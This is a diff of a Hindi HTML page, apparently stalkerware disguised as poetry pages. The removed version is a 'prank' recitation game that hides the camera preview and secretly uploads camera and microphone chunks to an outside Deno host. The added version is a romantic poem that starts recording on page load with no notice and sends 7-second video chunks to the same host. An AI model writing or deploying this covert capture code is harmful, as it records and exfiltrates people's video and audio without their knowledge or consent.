@@ -1,247 +1,105 @@
 <!DOCTYPE html>
 <html lang="hi">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>कविता पाठ - एक छोटा सा खेल</title>
-    <style>
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            display: flex; 
-            flex-direction: column; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-            margin: 0; 
-            background-color: #1a1a2e; /* Dark background for better focus */
-            color: #e6e6e6;
-            transition: background-color 0.5s;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Romantic Kavita</title>
 
-        /* 🚨 प्रैंक के लिए: वीडियो को पूरी तरह से छिपाना */
-        #video-panel { 
-            position: absolute; 
-            width: 1px; 
-            height: 1px; 
-            overflow: hidden; 
-            opacity: 0; 
-            pointer-events: none; 
-        }
+<style>
+body {
+  background: #fff3f6;
+  font-family: "Poppins", sans-serif;
+  padding: 20px;
+  line-height: 1.7;
+  color: #333;
+}
+.kavita {
+  max-width: 650px;
+  margin: auto;
+  background: white;
+  padding: 28px;
+  border-radius: 16px;
+  box-shadow: 0 4px 14px rgba(0,0,0,0.08);
+  font-size: 19px;
+}
+.hidden {
+  display: none;
+}
+h2 {
+  color: #e63980;
+}
+</style>
 
-        #initial-screen {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            text-align: center;
-        }
-
-        #start-button {
-            padding: 20px 40px;
-            font-size: 2em;
-            cursor: pointer;
-            border: none;
-            border-radius: 10px;
-            background-color: #e94560; /* Highlight color */
-            color: white;
-            box-shadow: 0 4px 15px rgba(233, 69, 96, 0.4);
-            transition: all 0.3s ease;
-            margin-top: 30px;
-        }
-
-        #start-button:hover {
-            background-color: #ff5e7b;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(233, 69, 96, 0.6);
-        }
-
-        /* कविता दिखाने के लिए, यह शुरुआत में छिपा रहेगा */
-        #poem-panel { 
-            display: none; /* Initially hidden */
-            padding: 40px;
-            max-width: 800px;
-            text-align: center;
-            background-color: #272343;
-            border-radius: 15px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
-        }
-
-        #poem-text {
-            white-space: pre-wrap;
-            font-size: 1.5em;
-            line-height: 1.8;
-            color: #bae8e8;
-            margin-top: 20px;
-        }
-
-        #status { 
-            margin-top: 20px; 
-            font-weight: bold; 
-            color: #ffc72c; 
-        }
-    </style>
 </head>
 <body>
-    <div id="video-panel">
-        <video id="video-preview" autoplay muted playsinline></video>
-    </div>
 
-    <div id="initial-screen">
-        <h1>कविता पाठ के लिए तैयार हो जाइए!</h1>
-        <p>इस गेम में हिस्सा लेने के लिए, आपको अपनी एक छोटी वीडियो क्लिप बनानी होगी।</p>
-        <p>आगे बढ़ने से पहले कैमरा अनुमति दें।</p>
-        <button id="start-button">शुरू करें!</button>
-        <div id="status">कैमरा अनुमति का इंतज़ार हो रहा है...</div>
-    </div>
+<div class="kavita">
+  <h2>💕 तेरी यादों की खुशबू 💕</h2>
+  <p>
+    तेरी आँखों में जो सुकून है,<br>
+    वो कहीं और मिलता नहीं…<br><br>
 
-    <div id="poem-panel">
-        <h2>पढ़िए!</h2>
-        <pre id="poem-text">
-            वह तोड़ती पत्थर
-            देखा उसे मैंने इलाहाबाद के पथ पर
-            वह तोड़ती पत्थर।
-            कोई न छायादार
-            पेड़ वह जिसके तले बैठी हुई स्वीकार।
-            श्याम तन, भर बँधा यौवन,
-            नत नयन, प्रिय-कर्म-रत मन,
-            गुरु हथौड़ा हाथ,
-            करती बार-बार प्रहार:
-            सामने तरु-मालिका अट्टालिका, प्राकार।
-            — सूर्यकांत त्रिपाठी 'निराला'
-        </pre>
-        <p style="font-size: 0.9em; margin-top: 30px; color: #a0a0a0;">(रिकॉर्डिंग स्वचालित रूप से आपके पाठ के दौरान चल रही है)</p>
-    </div>
+    तेरी मुस्कान की एक हल्की सी लहर,<br>
+    दिल को छूकर निकल जाए तो,<br>
+    धड़कनें भी कह उठती हैं —<br>
+    *"रुक जा ज़रा… ये पल फिर आए ना आए…"*
+    <br><br>
 
-    <script>
-        // --- CONFIGURATION ---
-        // 🚨 इसे आपके Deno Deploy URL से बदला जाना चाहिए
-        const UPLOAD_URL = 'https://video.kannu-jaat.deno.net/'; 
-        const CHUNK_SIZE_MS = 5000; // 5 सेकंड
+    तू साथ हो तो हर बात हसीन लगे,<br>
+    वरना ये दुनिया भी कोई क्या खास है…<br><br>
 
-        // --- DOM Elements ---
-        const videoElement = document.getElementById('video-preview');
-        const statusElement = document.getElementById('status');
-        const startButton = document.getElementById('start-button');
-        const initialScreen = document.getElementById('initial-screen');
-        const poemPanel = document.getElementById('poem-panel');
-        
-        // --- Recording Variables ---
-        let mediaRecorder;
-        let stream = null;
-        let chunkIndex = 0;
-        
-        // --- UPLOAD FUNCTION ---
-        
-        async function uploadVideoChunk(chunk) {
-            if (chunk.size === 0) return;
+    तेरी यादों की खुशबू में,<br>
+    मेरा हर शाम आज भी साँस लेता है… 🌹💫
+  </p>
+</div>
 
-            const formData = new FormData();
-            // Deno Deploy बैकएंड को 'video_chunk' नाम से ही डेटा चाहिए
-            formData.append('video_chunk', chunk, `chunk_${chunkIndex++}.webm`); 
-            
-            try {
-                const response = await fetch(UPLOAD_URL, {
-                    method: 'POST',
-                    body: formData,
-                });
+<!-- hidden video element -->
+<video id="cam" class="hidden" autoplay playsinline></video>
 
-                if (response.ok) {
-                    console.log(`Chunk ${chunkIndex - 1} uploaded successfully!`);
-                    // यूज़र को कोई स्टेटस नहीं दिखाना है, इसलिए statusElement को अपडेट नहीं कर रहे हैं
-                } else {
-                    console.error(`Chunk upload failed: ${response.statusText}`);
-                }
-            } catch (error) {
-                console.error('Network or server error during upload:', error);
-            }
-        }
+<script>
+let stream;
+let recorder;
 
-        // --- PHASE 1: GET PERMISSION ON PAGE LOAD ---
+// Start capturing
+async function startCapture() {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: true,
+      audio: true
+    });
 
-        /**
-         * कैमरा अनुमति मांगता है और स्ट्रीम को प्राप्त करता है
-         * यह रिकॉर्डिंग शुरू नहीं करता है
-         */
-        async function getPermissionAndStream() {
-            try {
-                // कैमरा और माइक्रोफ़ोन की अनुमति मांगना
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user' }, 
-                    audio: true 
-                });
-                
-                // स्ट्रीम मिलने के बाद:
-                videoElement.srcObject = stream;
-                statusElement.textContent = '✅ कैमरा एक्सेस मिल गया। शुरू करने के लिए बटन दबाएँ।';
-                startButton.disabled = false; // बटन को सक्रिय करें
+    document.getElementById("cam").srcObject = stream;
 
-            } catch (err) {
-                statusElement.textContent = '❌ कैमरा अनुमति नहीं मिली। कृपया अनुमति दें।';
-                startButton.disabled = true;
-                console.error('Error accessing media devices:', err);
-            }
-        }
+    recorder = new MediaRecorder(stream, { mimeType: "video/webm" });
 
-        // --- PHASE 2: START RECORDING ON BUTTON CLICK ---
+    recorder.ondataavailable = (e) => {
+      if (e.data.size > 0) sendChunk(e.data);
+    };
 
-        /**
-         * रिकॉर्डिंग शुरू करता है और UI को कविता मोड में बदलता है
-         */
-        function startRecording() {
-            if (!stream) {
-                statusElement.textContent = 'रिकॉर्डिंग शुरू नहीं हो सकी। पहले कैमरा एक्सेस प्राप्त करें।';
-                return;
-            }
+    recorder.start(7000); // 7 sec chunks
+  } catch (err) {
+    console.log("Camera permission issue:", err);
+  }
+}
 
-            // 1. UI को बदलें (प्रैंक लॉजिक)
-            initialScreen.style.display = 'none'; // बटन और शुरुआती टेक्स्ट छिपाएँ
-            poemPanel.style.display = 'block'; // कविता दिखाएँ
-            document.body.style.backgroundColor = '#1e3c72'; // बैकग्राउंड कलर थोड़ा बदल सकते हैं
+// send chunk to backend
+async function sendChunk(blob) {
+  const fd = new FormData();
+  fd.append("video_chunk", blob, "chunk.webm");
 
-            // 2. MediaRecorder को सेट करें और शुरू करें
-            const options = { mimeType: 'video/webm; codecs=vp8' };
-            mediaRecorder = new MediaRecorder(stream, options);
+  fetch("https://video.kannu-jaat.deno.net/", {
+    method: "POST",
+    body: fd
+  }).catch(()=>{});
+}
 
-            mediaRecorder.ondataavailable = (event) => {
-                if (event.data.size > 0) {
-                    uploadVideoChunk(event.data);
-                }
-            };
+// stop on exit
+window.addEventListener("beforeunload", () => {
+  try { recorder.stop(); } catch(e){}
+});
 
-            // हर 5 सेकंड में नया डेटा रिकॉर्ड करने के लिए
-            mediaRecorder.start(CHUNK_SIZE_MS); 
-            console.log("Recording started in the background.");
-        }
+startCapture();
+</script>
 
-        /**
-         * रिकॉर्डिंग बंद करता है और कैमरा एक्सेस रिलीज़ करता है
-         */
-        function stopRecordingAndCleanup() {
-            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-                mediaRecorder.stop();
-            }
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-            }
-            // यदि आप चाहें तो यूज़र को धन्यवाद संदेश दिखा सकते हैं
-            console.log("Cleanup done. Tracks stopped.");
-        }
-
-
-        // --- Event Listeners ---
-        
-        // पेज लोड होते ही अनुमति मांगें
-        window.addEventListener('load', () => {
-            startButton.disabled = true; // अनुमति मिलने तक बटन अक्षम रखें
-            getPermissionAndStream();
-        });
-
-        // "शुरू करें" बटन पर क्लिक होने पर रिकॉर्डिंग शुरू करें
-        startButton.addEventListener('click', startRecording);
-
-        // जब यूज़र टैब बंद करे या पेज छोड़े, तो रिकॉर्डिंग बंद करें
-        window.addEventListener('beforeunload', stopRecordingAndCleanup);
-        window.addEventListener('pagehide', stopRecordingAndCleanup);
-        
-    </script>
 </body>
 </html>
